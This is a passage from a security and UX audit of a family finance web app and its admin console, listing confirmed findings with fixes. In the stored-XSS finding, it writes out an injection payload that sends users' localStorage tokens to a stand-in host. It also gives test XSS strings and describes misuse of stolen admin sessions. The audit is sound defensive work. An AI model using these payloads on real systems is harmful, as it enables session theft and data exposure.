- **Evidence:** Layout registers `useShortcuts({ n, N, b, B, d, D, a, A })`. The handler checks only that the focused element is not input/textarea/select, then `const handler = handlers[e.key]; if (handler) { e.preventDefault(); handler(); }`. It never checks ctrlKey/metaKey/altKey, isContentEditable, or whether a dialog is open. The handlers object is recreated every render, so the listener re-subscribes on every render. There is no setting to disable or remap the shortcuts.
- **Failure scenario:** On a Mac, a user presses Cmd+A on the Reports page to select text and is navigated to the Add Asset form. On Windows, Ctrl+D (bookmark) opens Add Debt. A speech-input or switch user who triggers 'd' accidentally gets an unexpected route change. This fails WCAG 2.1.4 Character Key Shortcuts. With the PullDownSheet or command palette open on a button, 'n' navigates to the Add Transaction form underneath.
- **Recommendation:** In useShortcuts, return early when `e.ctrlKey || e.metaKey || e.altKey`, when the target isContentEditable, or when `document.querySelector('[aria-modal="true"],[role="dialog"][data-state="open"]')` matches. Memoise the handlers (useRef) and add a Settings toggle 'Keyboard shortcuts' (default on) persisted per device. Test: RTL that dispatching keydown {key:'a', metaKey:true} does not call openAddAsset, and that with the toggle off plain 'n' does nothing.
- **Verifier notes:** adversarial (confirmed): hooks.ts:16-29 only skips input/textarea/select, then calls preventDefault and the handler for handlers[e.key]. It never checks ctrlKey/metaKey/altKey, isContentEditable or an open dialog, so Cmd+A opens Add Asset. Layout.tsx:24-29 passes a fresh object literal on every render, so the listener re-subscribes each render. There is no setting to turn shortcuts off (WCAG 2.1.4).

### FE-UIS-11 · MEDIUM · Onboarding's estimated cash balance shows as confirmed; hardcoded '35% confirmed'; nudge sells bank sync

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** ux · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/lib/onboardingWiring.ts:132`, `react/src/lib/onboardingWiring.ts:135`, `react/src/pages/Onboarding.tsx:385`, `react/src/pages/Onboarding.tsx:386`, `react/src/pages/Onboarding.tsx:181`, `react/src/lib/onboardingNudges.ts:142`, `react/src/lib/onboardingNudges.ts:143`, `react/src/lib/onboardingNudges.ts:145`, `react/src/components/onboarding/NudgeBanner.tsx:40`, `react/src/components/dashboard/StartingBaselineBand.tsx:23`
- **Evidence:** Onboarding writes the Cash account `openingBalance: monthlyIncome, confidence: 'estimated', source: 'onboarding'`. A search shows EstimatedTag rendered only in StartingBaselineBand, ForYouReel, TxnRow, Insights and Reports. Nothing in pages/Accounts.tsx, components/accounts/* or lib/accountsView.ts reads account `confidence`, so the estimate shows as a real balance in Accounts, Net Worth and the dashboard. The tagged StartingBaselineBand clears itself after 5 transactions while the account stays 'estimated'. NudgeBanner's confirmedPct also excludes accounts from its records. The Reveal screen hard-codes 'Picture confirmed 35%' with a 35% bar and tracks `confirmed_pct: 35`, a fabricated metric. The bank_connect nudge tells every household with 5 or more logs 'Connect your bank and Vyact logs transactions automatically' and links to /settings, where no bank connection exists.
- **Failure scenario:** A user enters ₹80,000 take-home pay. Accounts and Net Worth then show 'Cash in Hand ₹80,000' as fact, although it was a monthly-pay figure, not counted cash. This violates the binding rule 'any value with confidence !== confirmed renders <EstimatedTag/>'. Later, the 'Tired of typing?' nudge sends them to Settings looking for a bank-sync feature that does not exist.
- **Recommendation:** Render <EstimatedTag/> on any account whose `confidence !== 'confirmed'` (Accounts cash summary, account rows, Net Worth breakdown), and have reconcile stamp confidence='confirmed'. Include accounts in NudgeBanner's records. Compute the Reveal percentage with `confirmedPctFromEntities` or remove it. Delete the bank_connect nudge until the feature exists. Tests: an accounts-view test that an estimated cash account renders the tag; a nudges test asserting no nudge copy references a feature flag that is off.
- **Verifier notes:** adversarial (confirmed): onboardingWiring.ts:132-137 sets the Cash openingBalance to monthlyIncome with confidence 'estimated'. EstimatedTag is used only in StartingBaselineBand, ForYouReel, TxnRow, Insights and Reports, never in the Accounts or Net Worth surfaces. NudgeBanner.tsx:40 records exclude accounts. Onboarding.tsx:181 tracks confirmed_pct:35 and :385-388 hard-codes 35%. onboardingNudges.ts:142-146 promises bank connect and links t…
- **Also reported as:** FE-UIC-11 (Onboarding-estimated balances and budgets render with no EstimatedTag)

### FE-UIS-12 · MEDIUM · One root ErrorBoundary: no reporting, 'Try Again' re-throws, no chunk-load recovery; e2e route live

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** reliability · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed) · **Known:** TD-05
- **Where:** `react/src/main.tsx:43`, `react/src/components/ui/ErrorBoundary.tsx:23`, `react/src/components/ui/ErrorBoundary.tsx:38`, `react/src/components/ui/ErrorBoundary.tsx:45`, `react/src/App.tsx:47`, `react/src/App.tsx:297`, `react/middleware.js:22`
- **Evidence:** The only boundary wraps the whole tree in main.tsx. `componentDidCatch` is a commented-out Sentry placeholder that does not even console.error, so production render crashes leave no trace. `handleReset` just clears state and re-renders the same subtree, which re-throws for deterministic bugs and for a rejected React.lazy import (React caches the rejected promise). There is no `vite:preloadError` / retry-and-reload handling for lazy route chunks. The fallback uses undefined classes `bg-bone dark:bg-ink ... dark:text-bone`. `/__e2e_error`, a page that throws on every render to test this boundary, is routed in production (`<Route path="/__e2e_error" ...>`) and allowlisted in middleware APP_SEGMENTS, so it is served with 200 instead of the noindex 404.
- **Failure scenario:** A null-deref in one Reports panel takes down the whole app shell, including navigation, for every user on that route. 'Try Again' loops back to 'Something broke' and the team never learns it happened. After a deploy, a tab without an up-to-date service-worker precache that requests an old hashed chunk gets a permanent 'Something broke' until a manual refresh. Anyone can link users to vyact.app/__e2e_error to show a crash page.
- **Recommendation:** Add route-level boundaries inside <Layout> (keep nav alive) and around FormPages. Report from componentDidCatch to an error sink (Sentry or a faults Edge endpoint, with no financial payload). On a ChunkLoadError or `vite:preloadError`, do a one-time `forceReloadForUpdate()`. Make Try Again reload the page when the same error repeats. Gate the __e2e_error route and its APP_SEGMENTS entry behind `import.meta.env.MODE !== 'production'` or a build flag used by Lane A. Tests: RTL where a child throws inside a route boundary and asserts the TopBar is still present; a PUB-020 variant asserting `__e2e_error` is not in the production build's segments.
- **Verifier notes:** adversarial (confirmed): main.tsx:43 has the only ErrorBoundary; Layout has none. ErrorBoundary.tsx:23-36 componentDidCatch only handles the E2E marker and does no reporting. handleReset (:38) just clears state. The fallback uses bg-bone, which is absent from the tailwind config and index.css. The repo has no preloadError or chunk retry handling. App.tsx:297 routes /__e2e_error unconditionally, and middleware.js:22 allowlists it.

### FE-UIS-13 · MEDIUM · Password change needs no re-auth (Settings, /auth/reset), unlike Danger Zone; instant delete keeps session

- **Slice:** Shell, settings, onboarding, accessibility · **Category:** security · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed)
- **Where:** `react/src/pages/Settings.tsx:243`, `react/src/lib/auth.ts:64`, `react/src/pages/auth/ResetPassword.tsx:66`, `react/src/pages/auth/ResetPassword.tsx:77`, `react/src/pages/Settings.tsx:131`, `react/src/pages/Settings.tsx:200`, `react/src/pages/Settings.tsx:209`
- **Evidence:** Danger Zone actions are gated by `confirmWithEmailCode` ('a warm/idle browser session alone is not sufficient proof'). `savePassword` calls `updatePassword(pwNew)` → `auth.updateUser({ password })` with no current password, no email code and no reauthentication nonce. ResetPassword sets `step='set'` for any existing session (`const session = await getSession(); if (session?.user) setStep('set')`), so a signed-in browser can set a new password at /auth/reset-password without a recovery link. The only rule is `length >= 8`. `onDeleteImmediately` deletes the account and navigates to sign-in without calling `signOut()`, so the cache purge and the push-unregister in signOut never run on that path.
- **Failure scenario:** Someone with brief access to an unlocked, signed-in phone opens Settings → Password, sets a new password, and locks the owner out of their own family ledger. No code or old password is asked, while 'Deactivate' would have required one. After 'Delete immediately', the device still holds the deleted user's IndexedDB ledger cache until something else clears it.
- **Recommendation:** Require `confirmWithEmailCode` (or `auth.reauthenticate()` + nonce, or enable Supabase 'Secure password change') before updatePassword in Settings. In ResetPassword, enter the 'set' step only from a PASSWORD_RECOVERY event or a `code` exchange, not from any session. Call `signOut()` (and await the cache purge) after executeAccountDeletion. Tests: unit test that savePassword invokes the code gate before updatePassword; RTL test that ResetPassword with a normal (non-recovery) session stays on 'request'.
- **Verifier notes:** adversarial (confirmed): auth.ts:64-67 updatePassword is bare auth.updateUser({password}). Settings.tsx:243-252 calls it without confirmWithEmailCode, unlike the Danger Zone at :158/:172/:189/:205. ResetPassword.tsx:77-78 enters step 'set' for any existing session. Settings.tsx:200-213 navigates without signOut(). config.toml has no [auth] secure_password_change, though the hosted dashboard setting could not be verified.

### ADM-01 · HIGH · Stored XSS on vyact.app: CMS category/slug break out of the inline script on /learn/<slug>

- **Slice:** Admin application (admin.vyact.app) · **Category:** security · **Auditor severity:** high · **Verification:** confirmed (adversarial: confirmed) · **Known:** 2026-09 audit S4 (partially fixed: JSON-LD boundary hardened; the inline-script and href sinks remain, and the CSP S4 asked for was never added)
- **Where:** `react/api/learn.js:167`, `react/api/learn.js:168`, `react/api/learn.js:169`, `react/api/learn.js:159`, `react/api/_page.js:156`, `react/api/_page.js:197`, `supabase/migrations/20260620120000_insights_hub.sql:9`, `supabase/migrations/00000000000001_production_state_baseline.sql:716`, `react/vercel.json:88`
- **Evidence:** lessonPage() builds an executable inline script from CMS fields: `vyTrack('learn_card_view',{slug:${JSON.stringify(c.slug)},category:${JSON.stringify(c.category)}})` (learn.js:167-169), and page() puts it raw into `<script>...${script}...</script>` (_page.js:197). JSON.stringify does not escape `<` or `/`, so the HTML parser ends the script at a literal `</script>`. The S4 fix (safeJsonLd, _page.js:23) covers only the JSON-LD blocks. content_items.category and slug have no CHECK constraints (insights_hub.sql:9-21 adds `category text` with no allowlist; baseline slug is just `text not null unique`). The insert/update policies allow any is_admin('content') user (baseline:714-716), and PostgREST will take any value; the CARD_CATEGORIES select exists only in the admin UI. Second sink: `<a href="${esc(c.source_url)}">` (learn.js:159). esc() escapes HTML characters but not the `javascript:` scheme, and source_url has no scheme check in the DB or the External form (Content.tsx:562). No Content-Security-Policy header exists in react/vercel.json, react/middleware.js or react/api (grep found none).
- **Failure scenario:** A content admin (the lowest tier, and with no MFA, the easiest account to phish) sends PATCH /rest/v1/content_items?slug=eq.ev-003-the-50-30-20-starting-point {"category":"Budgeting</script><script>fetch('https://x.example/?t='+encodeURIComponent(JSON.stringify(localStorage)))</script>"}. Every visitor to https://vyact.app/learn/ev-003-... runs the script on the consumer app's origin. The consumer Supabase session lives in localStorage there (react/src/lib/supabase.ts:50 persistSession, default storage), so signed-in users lose their access and refresh tokens. If a super admin has ever signed into the consumer app in that browser, their token carries the same uid and gets is_admin('super') rights. Result: a content-tier admin can escalate to full read of every household.
- **Recommendation:** Serialize every value placed in an inline script with the same HTML-safe encoder (safeJsonLd, which escapes `<`), or better, move slug/category into data- attributes read with getAttribute. Allow only http(s) for source_url (and video_url) in learn.js, and add DB CHECKs: `source_url ~ '^https://'`, `category in (...)` matching CARD_CATEGORIES, `slug ~ '^[a-z0-9-]+$'`. Add a CSP for vyact.app (script-src 'self' plus the GA host and hashes for the inline scripts). Test: extend learnJsonLd.test.ts so lessonPage({category:'x</script><script>alert(1)</script>', slug:'a', source_url:'javascript:alert(1)'}) yields no second <script> element and no javascript: href.
- **Verifier notes:** adversarial (confirmed): learn.js:167-169 puts JSON.stringify(c.slug/category) in an inline <script>; _page.js:197 emits it raw, and safeJsonLd (_page.js:23) covers only JSON-LD. The category column has no CHECK (insights_hub.sql:11); the update policy is just is_admin('content') (baseline:715); there is no CSP. Overstated: 'content' is a sibling tier of 'roles', not the lowest (baseline:374-388), and the super-admin escalation is speculati…
- **Also reported as:** FE-PUB-02 (Learn renders CMS fields unescaped in inline JS and javascript:-capable hrefs, on the app…)

### ADM-02 · HIGH · God-mode admin access has no MFA/AAL2 requirement and no session limit, client or server

- **Slice:** Admin application (admin.vyact.app) · **Category:** security · **Auditor severity:** high · **Verification:** confirmed (adversarial: confirmed) · **Known:** 2026-09 audit 7.1 — still open as described
- **Where:** `admin/src/lib/auth.ts:9`, `admin/src/lib/auth.ts:22`, `admin/src/components/AuthGate.tsx:51`, `supabase/migrations/00000000000001_production_state_baseline.sql:374`, `admin/src/pages/Settings.tsx:57`, `admin/src/pages/Settings.tsx:59`, `admin/src/lib/supabase.ts:20`
- **Evidence:** Sign-in is signInWithPassword (auth.ts:9-13) or Google OAuth, added in v1.4.0 (auth.ts:22-28). AuthGate admits anyone whose admin_roles row exists (`if (!serverRole) return <NotAuthorized/>`), with no check of session.aal or mfa factors. Server side, is_admin() reads only admin_roles (`where user_id = auth.uid() and case ...`) and never inspects `auth.jwt()->>'aal'`, so every admin policy and RPC accepts an aal1 token. Grepping 'aal2'/'mfa' across supabase/migrations and admin/src finds only the Settings row: "Not yet enforced — tracked for v1.4.0" (Settings.tsx:57). The admin is now at v1.4.2. Sessions use persistSession + autoRefreshToken with no inactivity limit (supabase.ts:20-26), and Settings marks the 30-minute timeout as "planned".
- **Failure scenario:** An attacker phishes or credential-stuffs one roles-tier admin password, or takes over the admin's Google account. With that aal1 token they can GET /rest/v1/transactions?select=* and read every family's ledger (see the least-privilege finding). With a super account they can also UPDATE ai_model_configs.base_url, sending the provider key and every Pip prompt (household figures) to their own host. The refresh token keeps the access indefinitely.
- **Recommendation:** Add `and coalesce(auth.jwt()->>'aal','aal1') = 'aal2'` inside is_admin(), so every policy and RPC enforces it at once. In AuthGate, call supabase.auth.mfa.getAuthenticatorAssuranceLevel() and route to TOTP enrolment/challenge before rendering children. Set a short refresh-token lifetime for admin sessions. Test: a SQL DO-block that sets request.jwt.claims to an admin uid with aal='aal1' must see is_admin() = false and admin_list_users() return zero rows; with aal='aal2' it must pass.
- **Verifier notes:** adversarial (confirmed): is_admin() is defined only in baseline:374-388 (never redefined) and reads admin_roles alone, with no aal check. AuthGate.tsx:62 gates only on serverRole. Grepping 'aal' in migrations and admin/src finds nothing. Settings.tsx:57 still says MFA is 'Not yet enforced — tracked for v1.4.0'. admin supabase.ts:20-26 uses persistSession/autoRefreshToken with no timeout.

### ADM-03 · MEDIUM · 'roles' admins hold raw SELECT on every household's ledger; no admin page needs it

- **Slice:** Admin application (admin.vyact.app) · **Category:** privacy · **Auditor severity:** high · **Verification:** confirmed (adversarial: confirmed) · **Known:** 2026-09 audit S3 privacy note and 7.1 'least-privilege RPCs instead of broad financial-table access' — still open

- **Evidence:** The latest SELECT policies on transactions, budgets, goals, debts, assets, memberships, profiles, activity_log (td06:48-131), accounts (money_map:128-129), recurring_schedules (v89:40-41), budget_allocations (v91:45) and notifications (v101:44) are all `is_member(household_id) or is_admin('roles')`. Nothing in admin/src reads transactions, accounts, debts, assets or budgets (adminApi.ts uses only households, memberships, subscriptions, activity_log and the RPCs). Indirect raw exposure exists too: log_domain_activity() writes `to_jsonb(new)` / `{old,new}` for every transaction/debt/asset/membership change into activity_log.changes, and the admin Audit page shows `JSON.stringify(r.changes, null, 2)` (Audit.tsx:110) with a one-click CSV export (Audit.tsx:37-52). transactions.description carries WhatsApp-ingested bank SMS text (CLAUDE.md). - **Failure scenario:** A support-tier ('roles') admin, or anyone who has stolen that session (no MFA), opens the Audit page and clicks Export CSV. They get the last 200 financial edits across all families: amounts, descriptions such as 'HDFC A/c XX1234 debited Rs 45,000 to Dr. Mehta clinic', account names. Calling /rest/v1/transactions directly returns every row ever written. The admin product exposes none of this; it exists only as an RLS grant.
- **Recommendation:** Remove `or is_admin('roles')` from the domain-table SELECT policies (transactions, accounts, debts, assets, budgets, budget_allocations, goals, recurring_schedules, notifications). Keep admin needs on aggregate SECURITY DEFINER RPCs (admin_dashboard_kpis already does this). If support needs per-household inspection, add a purpose-limited RPC that logs (admin, household, reason) before returning data. For the Audit page, return action/entity/actor only and not `changes`, or redact descriptions. Test: SQL DO-block impersonating a roles admin (not a member) must get 0 rows from transactions/accounts/debts and a non-null result from admin_dashboard_kpis().
- **Verifier notes:** adversarial (confirmed): The latest SELECT policies include `or is_admin('roles')` and are never superseded: td06:48-131, money_map:128, v89:40, v91:45, v101:44. adminApi.ts reads only households, memberships, subscriptions and activity_log. log_domain_activity (fix_household_delete...sql:30-60) stores full to_jsonb rows, and Audit.tsx:37-52/110 shows and exports them. The grant is deliberate (originally 'admins read all transactions') and …

### ADM-04 · MEDIUM · No audit trail of admin actions; 'Audit Log' is a deletable household changelog the Help page misdescribes

- **Slice:** Admin application (admin.vyact.app) · **Category:** compliance · **Auditor severity:** medium · **Verification:** confirmed (adversarial: confirmed) · **Known:** 2026-09 audit 7.1 ('Audited sensitive reads', 'Access review and revocation procedures') — still open
- **Where:** `admin/src/pages/Help.tsx:27`, `admin/src/pages/Help.tsx:31`, `admin/src/pages/Help.tsx:39`, `admin/src/pages/Help.tsx:57`, `admin/src/pages/Audit.tsx:60`, `supabase/migrations/20260701120000_v98_privacy_deletion_controls.sql:73`, `supabase/migrations/00000000000001_production_state_baseline.sql:313`, `supabase/migrations/00000000000001_production_state_baseline.sql:657`
- **Evidence:** activity_log is written only by log_domain_activity() on household tables and a few household RPCs. No trigger or RPC logs writes to admin_roles, content_items, category_classifications or ai_model_configs, and no admin read is logged. admin_roles has only a self-read policy (baseline:657), so grants happen in the SQL editor, which Help.tsx:27 confirms: `INSERT INTO admin_roles (user_id, role, granted_by) VALUES ('<their-uuid>', 'content', auth.uid())`. In the SQL editor auth.uid() is NULL, so granted_by is always null. The log is also not append-only: erase_household_data runs `delete from activity_log where household_id = h_id` (v98:73), and the FK is `on delete cascade` (baseline:313). Yet the UI says "append-only" (Audit.tsx:60), and Help says "Every admin action — role grants, content edits, household changes — appears in the Audit Log with actor, IP..." (Help.tsx:31) and "Logs are retained for the lifetime of the project" (Help.tsx:57). No IP column exists. Help.tsx:39 describes a 'Suspend' action that does not exist in Users.tsx.
- **Failure scenario:** A content admin deletes a published lesson, or a super admin grants themselves or a friend 'super' in the SQL editor. Afterwards nobody can tell who did it or when, because content_items and admin_roles keep no history and granted_by is NULL. During an incident review, staff trust the Help page, look for the grant in the Audit Log and find nothing.
- **Recommendation:** Create an append-only admin_audit table (no UPDATE/DELETE policy, not FK-cascaded to households) written by triggers on admin_roles, content_items, category_classifications and ai_model_configs, capturing auth.uid() and the old/new row. Add grant_admin_role/revoke_admin_role SECURITY DEFINER RPCs (super-only, aal2) that set granted_by = auth.uid() and log. Correct the Help copy and the 'append-only' label until then. Test: after an UPDATE on content_items as a content admin, admin_audit has one row with actor = that uid, and DELETE on admin_audit is refused.
- **Verifier notes:** adversarial (confirmed): activity_log.household_id is NOT NULL (baseline:192), so admin actions can't be recorded there at all. Help.tsx:31/57 claims there is an IP column and role/content logging; neither exists. Erase RPCs delete rows (v1030 net_worth:147) and the FK cascades (baseline:313).
